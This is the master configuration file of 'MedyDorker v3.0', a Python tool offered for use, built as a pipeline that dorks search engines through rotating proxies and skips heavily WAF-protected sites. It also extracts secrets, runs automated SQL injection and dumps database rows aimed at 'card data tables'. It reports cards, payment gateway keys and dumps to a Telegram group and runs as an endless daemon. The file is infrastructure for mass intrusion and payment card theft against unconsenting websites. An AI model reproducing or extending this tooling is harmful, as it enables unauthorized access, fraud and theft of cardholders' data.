"""
MedyDorker v3.0 — Master Configuration

Full-pipeline config: Dorker → Scanner → Exploiter → Dumper → Reporter
"""

import os
from dataclasses import dataclass, field
from typing import List, Dict, Optional

# Load .env file if present
try:
    from dotenv import load_dotenv
    load_dotenv(os.path.join(os.path.dirname(__file__), ".env"))
except ImportError:
    # python-dotenv not installed — rely on system env vars
    _env_path = os.path.join(os.path.dirname(__file__), ".env")
    if os.path.exists(_env_path):
        with open(_env_path) as _f:
            for _line in _f:
                _line = _line.strip()
                if _line and not _line.startswith('#') and '=' in _line:
                    _k, _v = _line.split('=', 1)
                    os.environ.setdefault(_k.strip(), _v.strip())


@dataclass
class DorkerConfig:
    """Configuration for MedyDorker v3.0."""
    
    # =============== TELEGRAM ===============
    telegram_bot_token: str = os.getenv("DORKER_BOT_TOKEN", "")
    telegram_chat_id: str = os.getenv("DORKER_CHAT_ID", "")  # Owner's chat for direct messages
    telegram_group_id: str = os.getenv("DORKER_GROUP_ID", "")  # Group for findings
    telegram_owner_id: str = os.getenv("DORKER_OWNER_ID", "")  # Bot owner (authorized user)
    
    # =============== DORK GENERATOR ===============
    params_dir: str = os.path.join(os.path.dirname(__file__), "params")
    max_dorks: int = 50000
    max_per_pattern: int = 500
    dork_shuffle: bool = True
    
    # =============== SEARCH ENGINE ===============
    search_delay_min: int = 8
    search_delay_max: int = 25
    results_per_dork: int = 15
    engines: List[str] = field(default_factory=lambda: [
        "duckduckgo", "bing", "startpage", "yahoo",
        "ecosia", "qwant", "brave",
    ])
    engine_shuffle: bool = True
    engine_fallback: bool = True
    
    # =============== PROXY ===============
    use_proxies: bool = True
    proxy_file: str = os.path.join(os.path.dirname(__file__), "proxies.txt")
    rotate_proxy_every: int = 5
    proxy_timeout: int = 15
    
    # =============== WAF DETECTION ===============
    waf_detection_enabled: bool = True
    waf_skip_extreme: bool = True  # Skip targets with extreme protection
    waf_skip_high: bool = False
    waf_timeout: int = 10
    waf_max_concurrent: int = 20
    
    # =============== SECRET EXTRACTION ===============
    secret_extraction_enabled: bool = True
    secret_timeout: int = 10
    secret_max_concurrent: int = 20
    
    # =============== SQL INJECTION SCANNER ===============
    sqli_enabled: bool = True
    sqli_timeout: int = 15
    sqli_max_concurrent: int = 10
    sqli_delay: int = 5  # For time-based injection
    sqli_techniques: List[str] = field(default_factory=lambda: [
        "error", "union", "boolean", "time"
    ])
    sqli_dbms: List[str] = field(default_factory=lambda: [
        "mysql", "mssql", "postgresql", "oracle", "sqlite"
    ])
    
    # =============== DATA DUMPER ===============
    dumper_enabled: bool = True
    dumper_max_rows: int = 500
    dumper_timeout: int = 20
    dumper_output_dir: str = os.path.join(os.path.dirname(__file__), "dumps")
    dumper_targeted: bool = True  # Focus on card data tables
    dumper_dios: bool = True  # Try DIOS technique
    
    # =============== DEEP CRAWLER ===============
    deep_crawl_enabled: bool = True
    deep_crawl_max_pages: int = 50
    deep_crawl_max_depth: int = 3
    deep_crawl_timeout: int = 10
    
    # =============== REPORTER ===============
    reporter_rate_limit: float = 1.0  # Min seconds between messages
    reporter_batch_size: int = 5
    reporter_status_interval: int = 3600  # Status update every N seconds
    report_gateways: bool = True
    report_cards: bool = True
    report_sqli: bool = True
    report_dumps: bool = True
    report_secrets: bool = True
    
    # =============== MADY BOT INTEGRATION ===============
    mady_bot_feed: bool = True  # Auto-feed found gateways to Mady bot
    mady_bot_path: str = os.getenv("MADY_BOT_PATH", "/home/null/Desktop/Mady7.0.2/Mady_Version7.0.0")
    
    # =============== DAEMON MODE ===============
    continuous: bool = True
    cycle_delay: int = 120  # Seconds between dork cycles
    max_cycles: int = 0  # 0 = infinite
    
    # =============== STORAGE ===============
    found_sites_file: str = os.path.join(os.path.dirname(__file__), "found_sites.json")
    seen_domains_file: str = os.path.join(os.path.dirname(__file__), "seen_domains.txt")
    vulnerable_urls_file: str = os.path.join(os.path.dirname(__file__), "vulnerable_urls.json")
    gateway_keys_file: str = os.path.join(os.path.dirname(__file__), "gateway_keys.json")
    
    # =============== SKIP DOMAINS ===============
    skip_domains: List[str] = field(default_factory=lambda: [
        "github.com", "github.io", "githubusercontent.com",
        "stackoverflow.com", "stackexchange.com",
        "stripe.com", "stripe.dev",
        "npmjs.com", "npmjs.org",
        "pypi.org", "pypi.python.org",
        "docs.google.com", "drive.google.com",
        "youtube.com", "youtu.be",
        "twitter.com", "x.com",
        "facebook.com", "fb.com",
        "linkedin.com",
        "reddit.com",
        "wikipedia.org", "wikimedia.org",
        "medium.com",
        "wordpress.org", "wordpress.com",
        "w3schools.com",
        "developer.mozilla.org",
        "mozilla.org",
        "apache.org",
        "docker.com",
        "heroku.com",
        "vercel.app",
        "netlify.app",
        "replit.com",
        "codepen.io",
        "jsfiddle.net",
        "pastebin.com",
        "archive.org",
        "web.archive.org",
        "amazon.com", "amazonaws.com",
        "microsoft.com",
        "apple.com",
        "google.com",
        "cloudflare.com",
        "akamai.com",
        "fastly.com",
        "bitbucket.org",
        "gitlab.com",
        "sourceforge.net",
        "example.com",
        "localhost",
    ])
    
    # =============== VALIDATION ===============
    validation_timeout: int = 15
    max_concurrent_validations: int = 10
    min_content_length: int = 500  # Skip pages with less content
    
    # =============== PRIORITY CATEGORIES =============== 
    # (used by generator for weighted selection)
    primary_categories: List[str] = field(default_factory=lambda: [
        "cards", "gateways",
    ])
    secondary_categories: List[str] = field(default_factory=lambda: [
        "secrets", "sqli", "databases", "cloud",
    ])
